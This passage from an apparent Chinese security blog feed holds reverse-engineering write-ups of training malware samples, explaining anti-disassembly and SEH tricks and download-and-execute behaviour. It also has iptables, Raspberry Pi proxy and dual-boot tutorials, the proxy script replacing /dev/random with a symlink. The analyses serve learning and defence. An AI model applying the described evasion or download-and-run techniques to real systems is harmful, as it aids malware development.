id="5-删除博客文件夹文件，保留部分"><a href="#5-删除博客文件夹文件，保留部分" class="headerlink" title="5.删除博客文件夹文件，保留部分"></a>5.删除博客文件夹文件，保留部分</h3><p>打开原来的博客文件夹,只需保留_config.yml，theme/，source/，scaffolds/，package.json，.gitignore 这些项目，删除其他的文件。</p><h3 id="6-git-bush"><a href="#6-git-bush" class="headerlink" title="6.git bush"></a>6.git bush</h3><p>在本文件夹下git bush,运行cnpm install</p><h3 id="7-安装部署插件"><a href="#7-安装部署插件" class="headerlink" title="7.安装部署插件"></a>7.安装部署插件</h3><p>npm install hexo-deployer-git –save</p><h3 id="8-测试"><a href="#8-测试" class="headerlink" title="8.测试"></a>8.测试</h3><p>此时就可以hexo g &amp;&amp; hexo d 测试是否成功了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;1-安装node-js和git&quot;&gt;&lt;a href=&quot;#1-安装node-js和git&quot; class=&quot;headerlink&quot; title=&quot;1.安装node.js和git&quot;&gt;&lt;/a&gt;1.安装node.js和git&lt;/h3&gt;&lt;p&gt; 这个不用多说，直接下载安装就行了。
      
    
    </summary>
    
      <category term="杂学" scheme="http://scuzhangzhang.github.io/categories/%E6%9D%82%E5%AD%A6/"/>
    
    
      <category term="杂学" scheme="http://scuzhangzhang.github.io/tags/%E6%9D%82%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>对抗反汇编分析</title>
    <link href="http://scuzhangzhang.github.io/2017/10/22/%E5%AF%B9%E6%8A%97%E5%8F%8D%E6%B1%87%E7%BC%96%E5%88%86%E6%9E%90/"/>
    <id>http://scuzhangzhang.github.io/2017/10/22/对抗反汇编分析/</id>
    <published>2017-10-21T16:00:00.000Z</published>
    <updated>2017-10-25T12:17:26.608Z</updated>
    
    <content type="html"><![CDATA[<p>1.样本是恶意代码实战中的Lab15-03.exe。</p><p>2.IDA 打开发现在00401016处有标红，IDA识别出了一些异常，仔细分析发现，把0x40148c写到了ebp+4的位置，而这个位置刚好是main函数返回地址的位置，通过改写此处的内容让main返回的时候执行0x40148c位置处的代码。</p><p><img src="https://i.imgur.com/vd4KEI6.png" alt=""></p><p>2.由此可看出主函数应该是非常正常，不会看出有什么恶意的地方。分析0x40148c处的代码。你此处的代码在0x401496处，有明显标红，说明有反汇编异常，一般都是恶意代码作者故意制作的来影响反汇编的结果。此处是一个很明显的对抗反汇编，上一步是跳转到401497的位置，而这个位置是jmp 这条指令的中间，这显然是不可能的，在此处按d键，把代码转为数据显示，然后把401497后面的数据按c键再转回代码，注意对齐。然后把401496位置的数据改为nop,可以通过Edit-&gt;Patch Program-&gt;change word ,把E9改为90，然后按c转换为代码就可以了。效果如图</p><p><img src="https://i.imgur.com/Qtl0ZFP.png" alt=""></p><p>继续往下看，发现有一个除零异常出现 ，</p><p><img src="https://i.imgur.com/ng6kIn0.png" alt=""></p><p>显然恶意代码先把异常处理函数的地址存到FS寄存器，然后出发除零异常执行此处的函数。显此处显然异常处理函数的地址是0x4014c0，而0x4014c0位置处的IDA没有识别为代码。按c键来转换为代码，继续向下看，在0x4014D7位置处，又出现了一个与0x401496处的相似的异常，同样的方法进行处理，结果如图</p><p><img src="https://i.imgur.com/d8PyGdS.png" alt=""></p><p>这个估计就是恶意代码真正要做的事情的代码了。继续向下看，有个URLDownloadToFileA函数，显然很恶意。下面还有个反汇编异常先处理了，先D后C，然后结果如下，</p><p><img src="https://i.imgur.com/0TKYBzh.png" alt=""></p><p>到此整个代码就分析完了，主要是4014c0处是真正要关注的，下面分析这个位置的代码</p><p><img src="https://i.imgur.com/KPoVtCC.png" alt=""><br><img src="https://i.imgur.com/ue6meMj.png" alt=""></p><p>主要关注标红的位置，此处看不出什么来，在OD中实际执行一下来看。</p><p>直接在0x40148c处下断点，然后直接f9运行到此处，若看到一堆数据，右键分析-&gt;从模块中删除分析就可以了，改写相应位置的异常按照IDA那样，实验过程发现se处理程序的确是0x4014c0但是程序并没有跳到那个位置而是终止了，没搞明白，为了真正看到0x4014c0处的具体执行情况。我选择直接编辑汇编代码。写入jmp 0x4014c0,</p><p><img src="https://i.imgur.com/kijEK2T.png" alt=""></p><p>发现在0x4014db处好像也是异常终止了，后改为</p><p><img src="https://i.imgur.com/yhPNUnh.png" alt=""></p><p>正常了、<br>然后在四个函数处下断点观察参数信息和返回信息，</p><p><img src="https://i.imgur.com/KK9LVGS.png" alt=""></p><p>0x401534明显是一个解密函数，然后把网址和文件就解密出来，然后URLDownloadToFileA下载，winexec 执行下载的文件。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;1.样本是恶意代码实战中的Lab15-03.exe。&lt;/p&gt;
&lt;p&gt;2.IDA 打开发现在00401016处有标红，IDA识别出了一些异常，仔细分析发现，把0x40148c写到了ebp+4的位置，而这个位置刚好是main函数返回地址的位置，通过改写此处的内容让main返回的
      
    
    </summary>
    
      <category term="逆向" scheme="http://scuzhangzhang.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="逆向" scheme="http://scuzhangzhang.github.io/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>iptables</title>
    <link href="http://scuzhangzhang.github.io/2017/10/20/iptables/"/>
    <id>http://scuzhangzhang.github.io/2017/10/20/iptables/</id>
    <published>2017-10-19T16:00:00.000Z</published>
    <updated>2017-10-25T03:44:43.448Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>&emsp;&emsp;当主机收到一个数据包后，数据包先在内核空间中处理，若发现目的地址是自身，则传到用户空间中交给对应的应用程序处理，若发现目的不是自身，则会将包丢弃或进行转发。</p><p>&emsp;&emsp;iptables实现防火墙功能的原理是：在数据包经过内核的过程中有五处关键地方，分别是PREROUTING、INPUT、OUTPUT、FORWARD、POSTROUTING，称为钩子函数，iptables这款用户空间的软件可以在这5处地方写规则，对经过的数据包进行处理，规则一般的定义为“如果数据包头符合这样的条件，就这样处理数据包”。</p><p>&emsp;&emsp;iptables中定义有表，分别表示提供的功能，有filter表（实现包过滤）、nat表（实现网络地址转换）、mangle表（实现包修改）、raw表（实现数据跟踪），这些表具有一定的优先级：raw–&gt;mangle–&gt;nat–&gt;filter</p><p><img src="https://i.imgur.com/Fl0nfg8.png" alt=""></p><p><img src="https://i.imgur.com/OHQyUMC.png" alt=""></p><h2 id="常用操作"><a href="#常用操作" class="headerlink" title="常用操作"></a>常用操作</h2><p>&amp;emsp常用操作命令    说明</p><p>-A    在指定链尾部添加规则</p><p>-D    删除匹配的规则</p><p>-R    替换匹配的规则</p><p>-I    在指定位置插入规则</p><pre><code>例：iptables -I INPUT 1 --dport 80 -j ACCEPT（将规则插入到filter表INPUT链中的第一位上）</code></pre><p>-L/S    列出指定链或所有链的规则</p><p>-F    删除指定链或所有链的规则</p><p>-N    创建用户自定义链</p><pre><code>例：iptables -N allowed</code></pre><p>-X    删除指定的用户自定义链</p><p>-P    为指定链设置默认规则策略，对自定义链不起作用</p><pre><code>例：iptables -P OUTPUT DROP</code></pre><p>-Z    将指定链或所有链的计数器清零</p><p>-E    更改自定义链的名称</p><pre><code>例：iptables -E allowed disallowed</code></pre><p>-n    ip地址和端口号以数字方式显示</p><pre><code>例：iptables -Ln</code></pre><p>常见规则匹配器    说明</p><p>-p tcp|udp|icmp|all    匹配协议，all会匹配所有协议</p><p>-s addr[/mask]    匹配源地址</p><p>-d addr[/mask]    匹配目标地址</p><p>–sport port1[:port2]    匹配源端口(可指定连续的端口）</p><p>–dport port1[:port2]    匹配目的端口(可指定连续的端口）</p><p>-o interface    匹配出口网卡，只适用FORWARD、POSTROUTING、OUTPUT。</p><pre><code>例：iptables -A FORWARD -o eth0</code></pre><p>-i interface    匹配入口网卡，只使用PREROUTING、INPUT、FORWARD。</p><p>–icmp-type     匹配icmp类型（使用iptables -p icmp -h可查看可用的ICMP类型<br>）</p><p>–tcp-flags mask comp    匹配TCP标记，mask表示检查范围，comp表示匹配mask中的哪些标记。</p><pre><code>例：iptables -A FORWARD -p tcp --tcp-flags ALL SYN，ACK -j ACCEPT（表示匹配SYN和ACK标记的数据包）</code></pre><p>目标动作    说明</p><p>ACCEPT    允许数据包通过</p><p>DROP    丢弃数据包</p><p>REJECT    丢弃数据包，并且将拒绝信息发送给发送方</p><p>SNAT    源地址转换（在nat表上）</p><pre><code>例：iptables -t nat -A POSTROUTING -d 192.168.0.102 -j SNAT --to 192.168.0.1 </code></pre><p>DNAT    目标地址转换（在nat表上）</p><pre><code>例：iptables -t nat -A PREROUTING -d 202.202.202.2 -j DNAT --to-destination 192.168.0.102</code></pre><p>REDIRECT    目标端口转换（在nat表上）</p><pre><code>例：iptables -t nat -D PREROUTING -p tcp --dport 8080 -i eth2.2 -j REDIRECT --to 80</code></pre><p>MARK    将数据包打上标记</p><pre><code>例：iptables -t mangle -A PREROUTING -s 192.168.1.3 -j MARK --set-mark 60</code></pre><h3 id="注意要点："><a href="#注意要点：" class="headerlink" title="注意要点："></a>注意要点：</h3><pre><code>1、目标地址转换一般在PREROUTING链上操作2、源地址转换一般在POSTROUTING链上操作</code></pre><p>state：匹配指定的状态数据包</p><p>参数    说明</p><p>–state value    value可以为NEW、RELATED（有关联的）、ESTABLISHED、INVALID（未知连接）</p><p>例子：<br>    iptables -A INPUT -m state –state NEW，ESTABLISHED -j ACCEPT</p><h2 id="常见iptables"><a href="#常见iptables" class="headerlink" title="常见iptables"></a>常见iptables</h2><p>&emsp;&emsp;MASQUERADE：是动态分配ip时用的IP伪装：在nat表的POSTROUTING链加入一条规则:所有从ppp0口送出的包会被伪装（MASQUERADE）</p><p> iptables -t nat -A POSTROUTING -o ppp0 -j MASQUERADE</p><p>&emsp;&emsp;REDIRECT：重定向，这个在squid透明代理时肯定要用到它</p><p> 所有从eth1进入的请求80和82端口的数据，被转发到80端口，由squid处理。</p><p> iptables -t nat -A PREROUTING - -i eth1 -p tcp -m multiport –dports 80,82 -j REDIRECT –to-ports 80</p><p>保存和恢复iptables规则</p><p>使用iptables-save可以保存到特定文件中</p><p>&emsp;&emsp;iptables-save &gt;/etc/sysconfig/iptables_save</p><p>使用iptables-restore可以恢复规则</p><p>&emsp;&emsp;iptables-restore&lt;/etc/sysconfig/iptables_save</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;p&gt;&amp;emsp;&amp;emsp;当主机收到一个数据包后，数据包先在内核空间中处理，若发现目的地址是自身，则传到用户空间中交给对应的应用程序处理，若发
      
    
    </summary>
    
      <category term="网络" scheme="http://scuzhangzhang.github.io/categories/%E7%BD%91%E7%BB%9C/"/>
    
    
      <category term="网络" scheme="http://scuzhangzhang.github.io/tags/%E7%BD%91%E7%BB%9C/"/>
    
  </entry>
  
  <entry>
    <title>恶意代码重定向</title>
    <link href="http://scuzhangzhang.github.io/2017/10/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E9%87%8D%E5%AE%9A%E5%90%91/"/>
    <id>http://scuzhangzhang.github.io/2017/10/16/恶意代码重定向/</id>
    <published>2017-10-15T16:00:00.000Z</published>
    <updated>2017-10-25T07:11:55.201Z</updated>
    
    <content type="html"><![CDATA[<p>&emsp;1.首先用strings查看字符串，发现<a href="http://www.practicalmalwareanalysis.com/start.htm，User-Agent字样，以及C:\autobat.exe，疑似编码用的字符串：" target="_blank" rel="external">http://www.practicalmalwareanalysis.com/start.htm，User-Agent字样，以及C:\autobat.exe，疑似编码用的字符串：</a></p><pre><code>/abcdefghijklmnopqrstuvwxyz0123456789:.以及CreateFile，CreateProcessA，InternetReadFileInternetCloseHandleInternetOpenUrlAInternetOpenAWININET.dllURLDownloadToCacheFileA </code></pre><p>&emsp;&emsp;显式调用高层API COM接口，以及Wininet 接口函数。<br><img src="https://i.imgur.com/ODPMB8W.png" alt=""><br><img src="https://i.imgur.com/qDJ4DI5.png" alt=""><br>这些函数，这些都是重要信息需要关注的。</p><p>&emsp;&emsp;2.IDA加载程序分析，首先是401457函数，调用了CreateFileA和ReadFile函数，具体分析发现是打开’C:\autobat.exe’,失败了调用函数，分析可知是把’<a href="http://www.practicalmalwareanalysis.com/start.htm&#39;,0写入文件C:\autobat.exe，重命名该函数为write_url,然后再次调用401457函数，分析可得是把该网址读到缓冲区ipbuffer,命名该函数为read_url,返回值为1，然后接下来调用4011f3函数，首先是在szagent地址存放硬编码的头部信息，但是错误的多写了User-Agent：这样会导致实际得到的头部会出现User-Agent:User-Agent:的情况。然后下面是InternetOpenA和InternetOpenUrlA函数打开http://www.practicalmalwareanalysis.com/start.htm，打开成功后InternetReadFile读取页面信息，" target="_blank" rel="external">http://www.practicalmalwareanalysis.com/start.htm&#39;,0写入文件C:\autobat.exe，重命名该函数为write_url,然后再次调用401457函数，分析可得是把该网址读到缓冲区ipbuffer,命名该函数为read_url,返回值为1，然后接下来调用4011f3函数，首先是在szagent地址存放硬编码的头部信息，但是错误的多写了User-Agent：这样会导致实际得到的头部会出现User-Agent:User-Agent:的情况。然后下面是InternetOpenA和InternetOpenUrlA函数打开http://www.practicalmalwareanalysis.com/start.htm，打开成功后InternetReadFile读取页面信息，</a> 首先搜索&lt;no’字符串，然后调用401000函数，</p><p><img src="https://i.imgur.com/ht0pUfZ.png" alt=""></p><p>&emsp;&emsp;进去分析发现是对&lt;noscript标签的不规则比较，然后对判断是否后面会有<a href="http://www.practicalmalwareanalysis.com，然后找到“96”的位置结束，然后把v7地址存放的内容赋到a3地址。" target="_blank" rel="external">http://www.practicalmalwareanalysis.com，然后找到“96”的位置结束，然后把v7地址存放的内容赋到a3地址。</a></p><p><img src="https://i.imgur.com/akX3WUw.png" alt=""></p><p>&emsp;&emsp;函数401000成功返回1，然后4011f3也返回1，最后执行401684函数，函数有两个参数，一个是刚刚的a3，另一个是v6的地址。v6=1,打开401684函数进行分析，是现实strtok函数，把字符串分为两部分，分别赋给两变量，然后是个case语句，当发现首字母为d时，执行401565函数，分析401565函数，首先是401147函数初步分析发现是个解码函数，然后后面是URLDownloadToCacheFileA，CreateProcessA函数，是把下载的程序运行起来。首字母为n时，v6置1，首字母为s时，sleep特定的时间，首字母为r时，运行401651函数，进去函数进行分析，发现又是刚刚那个解码函数401147，然后再次调用write_url函数，由此可以知道应该是个url重定向。到此整个样本就已经分析结束了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&amp;emsp;1.首先用strings查看字符串，发现&lt;a href=&quot;http://www.practicalmalwareanalysis.com/start.htm，User-Agent字样，以及C:\autobat.exe，疑似编码用的字符串：&quot; target=&quot;_b
      
    
    </summary>
    
      <category term="逆向" scheme="http://scuzhangzhang.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="逆向" scheme="http://scuzhangzhang.github.io/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>对抗反汇编</title>
    <link href="http://scuzhangzhang.github.io/2017/10/16/%E5%AF%B9%E6%8A%97%E5%8F%8D%E6%B1%87%E7%BC%96/"/>
    <id>http://scuzhangzhang.github.io/2017/10/16/对抗反汇编/</id>
    <published>2017-10-15T16:00:00.000Z</published>
    <updated>2017-10-25T07:18:53.412Z</updated>
    
    <content type="html"><![CDATA[<p>1.插入流氓字节，阻止真正的指令被反汇编</p><blockquote><p>线性反汇编和面向代码流的反汇编：</p><p>线性反汇编是遍历一个代码段，一次一条指令的线性反汇编，不考虑代码流的控制指令。而面向代码流的反汇编是会检查每一条指令。然后建立反汇编的地址列表，然后这样的反汇编算法会更加先进，而不易出错。比如：</p></blockquote><pre><code>.text:00401035                 jz      short near ptr loc_401037+1.text:00401037.text:00401037 loc_401037:                             ; CODE XREF: .text:00401035j.text:00401037                 call    near ptr 8B4C55C7h</code></pre><blockquote><p>观察以上的汇编代码，你会发现jz跳转到了call 指令中间，这显然是不可能的，所以call指令一定是一个数据而不是代码，在此处按d键，然后再观察</p><pre><code>                 xor     eax, eax.text:00401035                 jz      short loc_401038.text:00401035 ; ---------------------------------------------------------------------------.text:00401037                 db 0E8h.text:00401038 ; ---------------------------------------------------------------------------.text:00401038.text:00401038 loc_401038:                             ; CODE XREF: .text:00401035j.text:00401038                 mov     eax, [ebp+0Ch]</code></pre><p>这样显然很正确了，对于call 指令而言，如果后面四个字节跟的是地址，它对应的机器码是0xe8，此处显然是把数据0xe8当成了call指令，才会出现这样的问题。</p></blockquote><p>2.固定条件的跳转指令</p><pre><code>   xor     eax, eax.text:00401035                 jz      short loc_401038</code></pre><p>3.函数指针问题 </p><pre><code> mov [ebp+var_4],offset sub_4011c0; call [ebp+var_4]可用IDA脚本语言IDC进行修正函数为AddCodeXref();</code></pre><p>3.函数未识别的问题 </p><blockquote><p>可以按p键来强制把一段代码变成函数<br>但是要把流氓字节nop,不然函数可能会出问题。用IDA自带的patch program来做。<br>也可用脚本idapython  代码如下：</p></blockquote><pre><code>import idaapiidaapi.CompileLine(&apos;static n_key(){ RunPythonStatement(&quot;nopIt()&quot;);}&apos;)AddHotkey(&quot;Alt-N&quot;,&quot;n_key&quot;)def nopIt():    start=ScreenEA()    end=NextHead(start)    for ea in range(start,end):        PatchByte(ea,0x90)    Jump(end)</code></pre><p>4，异常触发</p><pre><code>push offset sub_4014c0push large dword ptr fs:0mov large fs:0,espxor ecx,ecxdiv ecx</code></pre><blockquote><p>属于滥用结构化异常（SEH）来对抗反汇编，通过人为构造一些比如访问一个无效的内存区域，除0等来触发异常，</p><p>SHE链是一个函数列表，处理线程的异常，列表中的函数要么处理异常，要么向下传递，如果传递到最后一个异常处理函数，就会被认为是一个不能处理的异常，弹出“an unhandled exception has occurred ”。</p><p>查找SEH链，操作系统会检查FS寄存器，这个寄存器中包含一个段选择子，从概念上来讲，链表以栈的方式工作，第一个调用的是最后一个加入链表的记录。前面的例子就是把自己的异常处理加入到链表的头部，然后用除0来触发异常，进而执行自己的代码。</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;1.插入流氓字节，阻止真正的指令被反汇编&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;线性反汇编和面向代码流的反汇编：&lt;/p&gt;
&lt;p&gt;线性反汇编是遍历一个代码段，一次一条指令的线性反汇编，不考虑代码流的控制指令。而面向代码流的反汇编是会检查每一条指令。然后建立反汇编的地址列表，
      
    
    </summary>
    
      <category term="逆向" scheme="http://scuzhangzhang.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="逆向" scheme="http://scuzhangzhang.github.io/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>树莓派透明代理</title>
    <link href="http://scuzhangzhang.github.io/2017/10/16/%E6%A0%91%E8%8E%93%E6%B4%BE%E9%80%8F%E6%98%8E%E4%BB%A3%E7%90%86/"/>
    <id>http://scuzhangzhang.github.io/2017/10/16/树莓派透明代理/</id>
    <published>2017-10-15T16:00:00.000Z</published>
    <updated>2017-10-25T11:46:28.532Z</updated>
    
    <content type="html"><![CDATA[<p>1.安装vim</p><p>连网之后，首先安装vim,便于后面的配置文件的编写。</p><pre><code>sudo apt-get install vim</code></pre><p>2.静态ip  </p><p>图形界面貌似会失败，建议在配置文件里改：</p><pre><code>sudo vim /etc/dhcpcd.conf</code></pre><p>填写以下内容</p><pre><code>interface eth0static ip_address=ipstatic routers=网关static domain_name_servers=223.5.5.5</code></pre><p>3.配置路由转发：</p><pre><code>sudo vim  /etc/sysctl.conf</code></pre><p>设置：</p><pre><code>net.ipv4.ip_forward=1</code></pre><p>4.ssh开机自启动</p><p>&emsp;&emsp;ssh 连接树莓派还是很放方面的，不用每次都去接键盘之类的<br>但是树莓派的ssh 默认是不自启动的，在/etc/rc.local中添加</p><pre><code>sudo /etc/init.d/ssh start (exit 之前)</code></pre><p>5.shadowssocks 安装</p><p>建议pip 安装</p><blockquote><p>sudo pip install  shadowsocks<br>就可以了然后就是配置文件的编写</p><p>sudo mkdir /etc/shadowsocks<br>sudo touch /etc/shadowsocks/shadowsocks.json</p></blockquote><p>添加以下内容</p><pre><code>{     &quot;server&quot;:&quot;127.0.0.1&quot;,    &quot;server_port&quot;:ss服务器端口,    &quot;local_address&quot;:&quot;0.0.0.0&quot;,    &quot;local_port&quot;:1080,    &quot;password&quot;:&quot;ss密码&quot;,    &quot;timeout&quot;:600,    &quot;method&quot;:&quot;aes-256-cfb&quot;}</code></pre><p>6.redsocks安装</p><pre><code>git clone git@github.com:darkk/redsocks.git（克隆失败可以在其他地方下载后传过来） sudo apt-get install libevent-dev cd redsocksmake</code></pre><p>在redsocks 文件夹中有redsocks.conf.example<br>把它复制出来，重命名为 redsocks.conf<br>我习惯放在/etc目录下即/etc/redsocks.conf<br>然后编辑配置文件</p><pre><code>local_ip =0.0.0.0 ;local_port = 12345; 自己定义后面iptables要用ip = 127.0.0.1;port = 1080;</code></pre><p>7.kcptun 加速器的安装</p><p>Kcptun的作用主要是配合SS用来做加速。</p><p>下载地址</p><blockquote><p><a href="https://github.com/xtaci/kcptun/releases/latest" target="_blank" rel="external">https://github.com/xtaci/kcptun/releases/latest</a></p></blockquote><p>选择kcptun-linux-arm 那一个下载解压</p><blockquote><p>tar -zxf kcptun-linux-arm*.tar.gz<br>选择适合你的树莓派的二进制文件我选择的是client_linux_arm7 。</p></blockquote><p>创建配置文件如下：</p><pre><code>{  &quot;localaddr&quot;: &quot;:8888&quot;,  &quot;remoteaddr&quot;: &quot;服务器ip:端口&quot;,  &quot;key&quot;: &quot;very fast&quot;,  &quot;crypt&quot;: &quot;aes-128&quot;,  &quot;mode&quot;: &quot;fast2&quot;,  &quot;mtu&quot;: 1400,  &quot;sndwnd&quot;: 256,  &quot;rcvwnd&quot;: 2048,  &quot;datashard&quot;: 10,  &quot;parityshard&quot;: 3,  &quot;dscp&quot;: 46,  &quot;nocomp&quot;: false}</code></pre><p>然后把client_linux_arm7放到/usr/local/bin 里面<br>运行</p><blockquote><p>sudo client_linux_arm7 -c 配置文件<br>就可以了。</p></blockquote><p>8.iptabels </p><pre><code>sudo sslocal -c /etc/shadowsocks/shadowsocks.json &amp; &gt; /dev/null 2&gt;&amp;1 sudo redsocks -c /etc/redsocks/redsocks.conf &amp; &gt; /dev/null 2&gt;&amp;1 sudo iptables -t nat -N REDSOCKS sudo iptables -t nat -A REDSOCKS -d 0.0.0.0 -j RETURN sudo iptables -t nat -A REDSOCKS -d 127.0.0.0/8 -j RETURN sudo iptables -t nat -A REDSOCKS -d 192.168.0.0/16 -j RETURN sudo iptables -t nat -A REDSOCKS -d 10.0.0.0/16 -j RETURN sudo iptables -t nat -A REDSOCKS -d 服务器IP -j RETURN sudo iptables -t nat -A REDSOCKS -p tcp -j REDIRECT --to-ports 12345 sudo iptables -t nat -A OUTPUT -p tcp -j REDSOCKS sudo iptables -t nat -A PREROUTING -i eth0 -p tcp -j REDSOCKS</code></pre><p>9.此时你把局域网其他电脑设置成它还是不能上网，因为存在dns 问题通过安装dnsmasq来解决</p><pre><code>sudo apt-get install dnsmasq</code></pre><p>配置文件在 /etc/dnsmasq.conf<br>编辑配置文件<br>取消no-resolv前面的注释<br>加入 </p><pre><code>server=202.38.93.153 server=202.141.162.123</code></pre><p>保存重启dnsmasq  </p><pre><code>sudo service dnsmasq restart</code></pre><p>此时不出意外的话应该是可以把局域网内的其他主机网关s设置成 树莓派的ip ,然后实现透明上网。<br>建议dns 设置成</p><pre><code>server=202.38.93.153 server=202.141.162.123</code></pre><p>10 .善后工作<br>把上述的配置加入启动项</p><pre><code>sudo /etc/init.d/ssh startsudo client_linux_arm7 -c /home/pi/Desktop/configus.txt  &amp; &gt; /dev/null 2&gt;&amp;1sudo sslocal -c /etc/shadowsocks-libev/ss.conf &amp; &gt; /dev/null 2&gt;&amp;1sudo redsocks -c /etc/redsocks.conf &amp; &gt; /dev/null 2&gt;&amp;1sudo service dnsmasq restart</code></pre><p>附加：<br>热点配置<br>安装hostapd </p><pre><code>sudo apt-get install hostapd</code></pre><p>配置文件/etc/hostapd/hostapd.conf </p><pre><code>interface=wlan0 hw_mode=g channel=10 auth_algs=1 wpa=2 wpa_key_mgmt=WPA-PSK wpa_pairwise=CCMP rsn_pairwise=CCMP wpa_passphrase=wifi密码 ssid=wifi名字</code></pre><p>dnsmasq 配置文件/etc/dnsmasq.conf 中修改</p><pre><code>interface=wlan0dhcp-range=10.0.0.2,10.0.0.255,255.255.255.0,12h</code></pre><p>在启动项中/etc/rc.local 增加：</p><pre><code>sudo ifconfig wlan0 down sudo ifconfig wlan0 10.0.0.1 netmask 255.255.255.0 up sudo rm -rf /dev/random sudo ln -s /dev/urandom /dev/random sudo service dnsmasq restart sudo hostapd -B /etc/hostapd/hostapd.conf &amp; &gt; /dev/null 2&gt;&amp;1sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE sudo iptables -A FORWARD -i eth0 -o wlan0 -m state --state RELATED,ESTABLISHED -j ACCEPT sudo iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT</code></pre><p>以及在/etc/iptables 中增加</p><pre><code>sudo iptables -t nat -A PREROUTING -i wlan0 -p tcp -j REDSOCKS</code></pre><p>参考网址：<br><a href="http://fishedee.com/%E5%90%8E%E7%AB%AF/2016/11/30/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%81%9A%E9%80%8F%E6%98%8E%E4%BB%A3%E7%90%86.html" target="_blank" rel="external">http://fishedee.com/%E5%90%8E%E7%AB%AF/2016/11/30/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%81%9A%E9%80%8F%E6%98%8E%E4%BB%A3%E7%90%86.html</a></p><p><a href="http://www.jianshu.com/p/05d32b4e8fc0" target="_blank" rel="external">http://www.jianshu.com/p/05d32b4e8fc0</a></p><p><a href="http://blog.uiideas.com/2016/09/16/Kcptun%E4%BD%BF%E7%94%A8/" target="_blank" rel="external">http://blog.uiideas.com/2016/09/16/Kcptun%E4%BD%BF%E7%94%A8/</a></p><p><a href="https://story.tonylee.name/2016/03/31/yong-shu-mei-pai-da-zao-wu-xian-zhong-ji-ke-xue-shang-wang-lu-you-qi/" target="_blank" rel="external">https://story.tonylee.name/2016/03/31/yong-shu-mei-pai-da-zao-wu-xian-zhong-ji-ke-xue-shang-wang-lu-you-qi/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;1.安装vim&lt;/p&gt;
&lt;p&gt;连网之后，首先安装vim,便于后面的配置文件的编写。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo apt-get install vim
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;2.静态ip  &lt;/p&gt;
&lt;p&gt;图形界面貌似会失败，建议在配置文件里改：&lt;/p
      
    
    </summary>
    
      <category term="杂学" scheme="http://scuzhangzhang.github.io/categories/%E6%9D%82%E5%AD%A6/"/>
    
    
      <category term="杂学" scheme="http://scuzhangzhang.github.io/tags/%E6%9D%82%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>双系统安装（win10+ubuntu）</title>
    <link href="http://scuzhangzhang.github.io/2017/10/16/%E5%8F%8C%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/"/>
    <id>http://scuzhangzhang.github.io/2017/10/16/双系统安装/</id>
    <published>2017-10-15T16:00:00.000Z</published>
    <updated>2017-11-05T04:46:32.813Z</updated>
    
    <content type="html"><![CDATA[<p>1.我选择的 是win10加ubuntu双系统。</p><p>2.准备工作</p><pre><code>U盘一个16gwin10系统ubuntu系统</code></pre><p>3.备份好硬盘数据以后，空出一个分区，然后制作一个PE盘，然后进PE删除这个分区，使其处于未分配的空间状态，用于安装ubuntu ,然后安装win10，这个就不用多说了，大家都会。</p><p>4.安装结束以后，用大白菜iso装机方式，把ubuntu系统直接写入U盘，然后U盘其启动即可进入装机状态。</p><p>其他的跟一般装ubuntu一样，在分区那个位置，选择其他方式，选择手动分区，然后选择刚刚那个未分配空间，一般可以分4个分区。/boot 200M,swap分区视内存定,一般可以和内存一样大，然后剩下分/，15g-20g左右，剩下的可以全部给/home。引导驱动器选择/boot,然后继续安装正常方式来装就好了。</p><p>4.此时两个系统都安好了，但是此时还是默认win10启动，此时最重要的来了，下载一个叫EasyBCD的软件，选择添加新条目，然后选择Linux，然后名称，驱动器选择/boot对应的就好了。此时重启你就会发现有两个候选操作系统了。</p><p><img src="https://i.imgur.com/prFcTXH.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;1.我选择的 是win10加ubuntu双系统。&lt;/p&gt;
&lt;p&gt;2.准备工作&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;U盘一个16g
win10系统
ubuntu系统
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;3.备份好硬盘数据以后，空出一个分区，然后制作一个PE盘，然后进PE删除这个分区，使
      
    
    </summary>
    
      <category term="杂学" scheme="http://scuzhangzhang.github.io/categories/%E6%9D%82%E5%AD%A6/"/>
    
    
      <category term="杂学" scheme="http://scuzhangzhang.github.io/tags/%E6%9D%82%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>dll注入之APC注入</title>
    <link href="http://scuzhangzhang.github.io/2017/09/16/dll%E4%B9%8BAPC%E6%B3%A8%E5%85%A5/"/>
    <id>http://scuzhangzhang.github.io/2017/09/16/dll之APC注入/</id>
    <published>2017-09-15T16:00:00.000Z</published>
    <updated>2017-10-25T07:05:57.958Z</updated>
    
